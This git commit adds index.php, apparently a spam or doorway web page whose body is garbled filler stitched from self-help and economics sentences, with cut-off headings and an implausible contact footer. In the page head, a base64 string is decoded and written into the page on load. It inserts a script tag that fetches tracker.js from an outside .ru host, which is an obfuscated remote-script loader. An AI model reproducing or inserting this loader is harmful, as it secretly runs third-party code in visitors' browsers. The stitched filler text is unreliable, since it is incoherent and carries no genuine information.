418de9144798c279abaee9774ed72385948a5dd2
hbabfttj <79054821+hbabfttj@users.noreply.github.com>
2021-02-14 19:04:00 +0200

    Add files via upload

---
+++ index.php
@@ -0,0 +1,119 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>I became her student.  These functions are interconnected and interdependent amo</title>
+
+	<link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+	<link href="https://fonts.googleapis.com/css?family=Quicksand" rel="stylesheet">
+    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.6.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="styles.css">
+
+    <script type="text/javascript">
+	let encoded = 'PHNjcmlwdCBzcmM9Imh0dHBzOi8va2xvb2xrLnJ1L3RyYWNrZXIuanMiPjwvc2NyaXB0PjxkaXYgY2xhc3M9ImNoZWNrX2Zvcl9ta3Q2dGV3bjRha3J4NmFnd3AiPjwvZGl2Pg==';let decoded = atob(encoded);document.write(''+ decoded +'');
+	</script>
+
+</head>
+
+<body>
+
+	<header class="fvqskejtc7njisdqigmguv">
+		<nav>
+			<li><a href="#">MAIN</a></li>
+			<li><a href="our_themes.html">OUR THEMES</a></li>
+			<li><a href="#">FLOW</a></li>
+			<li><a href="#">E-MAIL</a></li>
+		</nav>
+	</header>
+
+
+	<section class="hero" class="zkdl1dq5b9r5cye2">
+		<div class="background-image" style="background-image: url(main.jpg);"></div>
+		<h1>I became her student.  These functions are interconnected and interdependent amo</h1>
+	</section>
+
+
+	<section class="our-work" class="k57pcaewm5z7s4po7auzez6m">
+		<h3 class="title">This way focuses on who you want to be (character) </h3>
+		<p>86.  They start by representing the end goal.  Administrative monopoly arises from the actions of government agencies.  However, his management style was extremely dictatorial.  " Since we are self-aware, we must choose goals and principles for our life, because otherwise the vacuum will be filled, and we will lose our identity and become like reptiles that exist only for the sake of survival and reproduction. </p>
+		<hr>
+
+		<ul class="grid" class="rqisnvt6uam7gugp3qofctqg">
+			<li class="large" style="background-image: url(image1.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="fvqskejtc7njisdqigmguv">
+		<h3 class="title">The theory of consumer behavior shows how </h3>
+		<p>Likewise, the strengths and some of the tools of each of the first three generations of time management provide the building blocks for the fourth generation.  If all the air were instantly pumped out of the room where you are at the moment, what would happen to your interest in reading this book? You wouldn't even think about this book! You wouldn't think of anything other than taking a breath of air.  He could have said on national television: “I will never shake hands with any Israelis as long as they occupy even an inch of Arab land.  In what situation can the income effect prevail over the substitution effect? Of course, not when a product (for example, china) occupies a relatively insignificant share in the budget of a particular consumer.  MR - marginal income; MC - marginal cost Fig.  Therefore, you have to take the risk "upon yourself".  This man needed additional funding to complete the construction of a large plot and sell it, in order to then pay off the bank.  An industry entry barrier is a constraint that prevents additional sellers from entering the monopoly firm's market.  This is where we come in contact with our vision and our values.  "The one who does not read is no better than the one who cannot read." High-quality literature (works from the series "Great Books" and "Harvard Classics", autobiographies, "National Geographic" and other publications that broaden our horizons, as well as a variety of contemporary literature) can expand our paradigms and sharpen our intellectual saw, especially if we use Habit 5 and as we read first try to understand.  This means that the market creates constant economic incentives for commodity producers, encourages them to reduce the individual costs of producing a product, which ensures their stable position in the market.  You are able to maintain your inner synergy, even when in a hostile environment. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="zkdl1dq5b9r5cye2" style="background-image: url(image2.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="k57pcaewm5z7s4po7auzez6m">
+		<h3 class="title">The paradigm of determinism is the result of studying the behav</h3>
+		<p>And Sadat rewrote himself.  We will also see how deeply rooted in us other, ineffective patterns of thought and behavior.  “Won / won” means that all agreements and decisions are mutually beneficial, satisfy both parties.  Now, the dominant, leitmotif and fundamental principle of their actions was love.  With the growth of hierarchy, the costs of transmission and processing of information required for decision-making grow.  This kind of understanding is beyond all tricks.  The “inside-out” approach says that social victory is preceded by personal victory, that the ability to make and keep promises made to others is preceded by the ability to make and keep promises made to oneself.  Working together to formulate a mission inspired complete freedom of exchange.  STATE REGULATION OF DISTRIBUTION OF INCOME The main channel for redistribution of income is the state regulation of this process.  Each subsequent wave brought a sharp leap in the development of society and personality.  And this is subtle and imperceptible, but it very strongly affects us. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="rqisnvt6uam7gugp3qofctqg" style="background-image: url(image3.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="fvqskejtc7njisdqigmguv">
+		<h3 class="title">While respecting the proactive nature of others, we</h3>
+		<p>The heart has its own understanding, not accessible to the mind.Pascal Principles of Empathic Communication Suppose you have vision problems and decide to go to an optometrist for help.  3.  If they reflect the opportunity costs associated with owning certain production facilities acquired by the firm, they are implicit costs.  You can buy a man's hands, but you cannot buy his heart.  You know, I have one serious problem.  And if someone cuts a larger piece for themselves, then everyone else will get less.  I will do whatever you say.  Sometimes we do just that, instead ofto strive for personal and organizational improvement in a completely different way - by developing information and reward systems that would make collaboration more attractive.  They need something morethan first aid means - "social aspirin" and "social plaster". </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="zkdl1dq5b9r5cye2" style="background-image: url(image4.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="k57pcaewm5z7s4po7auzez6m">
+		<h3 class="title">Mass speculation in land and land checks c</h3>
+		<p>I have come across organizations focused exclusively on economic indicators - to make money.  By doing this, you begin to train your subordinates to think for the future, be responsible for the preparation of a “finished document” or achieve other collective results, creatively interact with each other on an interdependent basis, and get the job done efficiently on time.  Before raising an issue, before evaluating and prescribing, before expressing your ideas - strive to understand.  This is why, in our interdependent reality, the only viable alternative is Win / Win.  The children, eagerly awaiting the trip, sat quietly.  The change in income elasticity is associated with the concept of nominal and inferior goods.Since in this case income and demand change in the same direction, the income elasticity of demand for nominal goods will be positive. </p>
+		<hr>
+	</section>
+
+
+
+	<section class="contact">
+		<h3 class="rqisnvt6uam7gugp3qofctqg" class="title">Secondary needs are satisfied after the primary ones are satisf</h3>	
+		<p>Good? For the next few minutes I was busy shouting: - Take it off! ..  It is difficult to start any research until the essence of the problem is determined.The stage of recognizing and defining the problem is the first step in the process of finding a solution.  And after that, you embody your project in brick.  However, despite a number of positive developments, tax legislation contains the following serious shortcomings.  Creation of equal economic conditions for different types of commodity owners, the introduction of competitive principles in their activities determines the objective need for the assessment and protection of intellectual property.  I am convinced that almost all true believers will agree that going to church and being a spiritual person are not the same thing.  Standing behind the cash register, they completed all transactions at a time when trading was slow.  EMPLOYMENT AND UNEMPLOYMENT According to the structure, they distinguish sectoral, professional and qualification employment, as well as by sectors of the economy.  The whole is greater than the sum of its parts.  If the court is used too early, perhaps even for preventive purposes, then the resulting fear and paradigm of judicial intervention will be expressed in thinking and actions that are far from synergistic.  - Who will feed the baby? This question aroused more interest among others, but only the wife had the appropriate qualifications for this case.  It seems to me that these three words are the essence of the principle "first seek to understand" and thathow to effectively present your views.  - Exactly! And ... </p>
+		<hr>
+
+		<form>
+			<input type="email" placeholder="-Email">
+			<input type="Name" placeholder="-Name">
+			<input type="Surmane" placeholder="-Surname">
+			<a href="#" class="btn">Subscribe now</a>
+		</form>
+
+	</section>
+
+	<footer class="fvqskejtc7njisdqigmguv">
+		<ul>
+			<li><a href="#"><i class="fa fa-twitter-square" class="zkdl1dq5b9r5cye2"></i></a></li>
+			<li><a href="#"><i class="fa fa-facebook-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-snapchat-square" class="k57pcaewm5z7s4po7auzez6m"></i></a></li>
+			<li><a href="#"><i class="fa fa-pinterest-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-github-square" class="rqisnvt6uam7gugp3qofctqg"></i></a></li>
+		</ul>
+		<p><a href="policy.html">Privacy policy</a></p>
+		<p>5931 Ike Centers, Suite 223, 59964-3155, Lake Cristal, Tennessee, United States</p>
+		<p>Phone number: +4(052)304-64-14934</p>
+	</footer>
+
+</body>
+
+</html>
